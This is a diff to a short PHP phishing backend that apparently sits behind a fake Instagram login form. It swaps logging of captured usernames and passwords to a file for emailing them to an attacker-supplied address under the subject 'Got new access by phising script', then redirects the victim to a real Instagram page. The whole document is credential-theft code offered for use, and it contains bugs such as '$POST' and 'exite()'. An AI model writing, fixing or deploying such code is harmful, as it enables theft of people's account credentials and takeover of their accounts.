@@ -1,9 +1,19 @@
-<?php // Ce script va ouvrir un fichier log.txt, inscrire les données du formulaire et refermer le fichier.
-$fp = fopen ("log.txt", "a");
-fputs($fp, "\n");
-fputs ($fp, "login : ".$_POST['username']);
-fputs ($fp, " / password : ".$_POST['password']);
-fclose ($fp);
-header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
-exite();
+
+<?php
+	mail_sender(){
+		$username = $POST['username'];
+		$password = $POST['password'];
+		
+		$reciever = "YOUR-EMAIL ADRRESS";
+		
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: https://www.instagram.com/thelinuxproject/?hl=fr");
+	}
 ?>
